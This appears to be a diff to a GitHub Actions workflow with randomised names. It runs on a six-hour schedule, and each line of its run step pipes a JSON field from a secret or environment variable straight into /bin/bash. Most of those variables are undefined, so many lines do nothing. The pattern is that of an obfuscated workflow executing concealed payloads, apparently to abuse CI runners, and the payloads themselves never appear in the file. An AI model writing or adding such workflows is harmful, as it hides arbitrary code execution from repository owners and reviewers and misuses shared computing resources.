@@ -3,25 +3,35 @@ name: personalhissing
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 5/6 * * *'
+    - cron: '20 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: personalhissing
         env:
-          qtb9: ${{ secrets.qtb9 }}
+          wdefp3603: ${{ secrets.wdefp3603 }}
         run: |
-          echo $qtb9 | jq -r .soj87559 | /bin/bash
-          echo $vgdts74350 | jq -r .v71 | /bin/bash
-          echo $pqii3924 | jq -r .qdp23296 | /bin/bash
-          echo $yzimv8 | jq -r .youal71438 | /bin/bash
-          echo $f43 | jq -r .eb440 | /bin/bash
-          echo $ivd1 | jq -r .hailh9 | /bin/bash
-          echo $fqmtu77 | jq -r .cl65843 | /bin/bash
-          echo $is96 | jq -r .lug505 | /bin/bash
-          echo $a604 | jq -r .aotd6 | /bin/bash
-          echo $q2 | jq -r .yjagx7674 | /bin/bash
-          echo $pjeyq7522 | jq -r .xuva1 | /bin/bash
+          echo $wdefp3603 | jq -r .v7 | /bin/bash
+          echo $nlarp24 | jq -r .lzhk1552 | /bin/bash
+          echo $qeiq3353 | jq -r .gwbf4 | /bin/bash
+          echo $mhu17887 | jq -r .hmd633 | /bin/bash
+          echo $e643 | jq -r .dxm2690 | /bin/bash
+          echo $my87 | jq -r .sod8006 | /bin/bash
+          echo $mhdrd4 | jq -r .eqt0009 | /bin/bash
+          echo $bzzbf9 | jq -r .nf252 | /bin/bash
+          echo $codxe5938 | jq -r .qd79259 | /bin/bash
+          echo $x21064 | jq -r .d12 | /bin/bash
+          echo $n8332 | jq -r .mv61502 | /bin/bash
+          echo $xb082 | jq -r .cr9 | /bin/bash
+          echo $hejs6 | jq -r .dzqpm583 | /bin/bash
+          echo $whiqc45303 | jq -r .ba14 | /bin/bash
+          echo $k56529 | jq -r .qfq12054 | /bin/bash
+          echo $we90674 | jq -r .m8113 | /bin/bash
+          echo $kw109 | jq -r .q7 | /bin/bash
+          echo $rx9 | jq -r .xcyvs853 | /bin/bash
+          echo $u522 | jq -r .tqex81 | /bin/bash
+          echo $nvwx123 | jq -r .kxw433 | /bin/bash
 
